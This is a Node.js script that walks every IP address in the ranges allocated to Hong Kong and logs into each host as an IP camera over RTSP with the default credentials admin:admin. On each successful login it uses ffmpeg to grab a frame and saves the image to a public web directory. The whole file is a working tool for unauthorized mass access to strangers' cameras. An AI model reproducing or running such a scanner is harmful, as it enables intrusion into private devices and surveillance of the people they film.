const ipInt = require('ip');
var request = require("request");
var sleep = require('sleep');
var spawn = require('child_process').spawn;

request.post(
	{
		url: 'http://services.ce3c.be/ciprg/?countrys=Hong Kong&format=by+input&format2=%7Bstartip%7D%2C%7Bendip%7D%0D%0A',
	    encoding:'utf8'
	},
	function(error, response, body){	
	    if(response.statusCode == 200){
	    	var ipList = body.split('\n');
	    	ipList.forEach(function(ip){
	    		var start = '';
				var end = '';
				var rtspCmd = '';
	    		if(ip !== '') {
		    		start = ipInt.toLong(ip.substr(0,ip.indexOf(',')));
		    		end = ipInt.toLong(ip.substr(ip.indexOf(',')+1));	    			
		    		for(i=start;i<=end;i++) {
						user = 'admin';
						pw = 'admin';
						req = '11';
						ip = ipInt.fromLong(i);
						link = 'rtsp://'+user+':'+pw+'@'+ip+'/'+req;
						rtspCmd = "ffmpeg -stimeout 1500000 -i "
							+link+" "
							+"-f image2 -vframes 1 -y "
							+"/var/www/html/ipcam/pic/"+ip+".jpeg 2>&1";
						var rtsp = spawn(rtspCmd);

						rtsp.stdout.on('data',function(data){console.log('data');});

	    				sleep.usleep(100000);
		    		}
	    		}
	    	});
	    }else{
	        console.log(response.statusCode);
	    }
	}	
);

function rtsp(ip) {

}
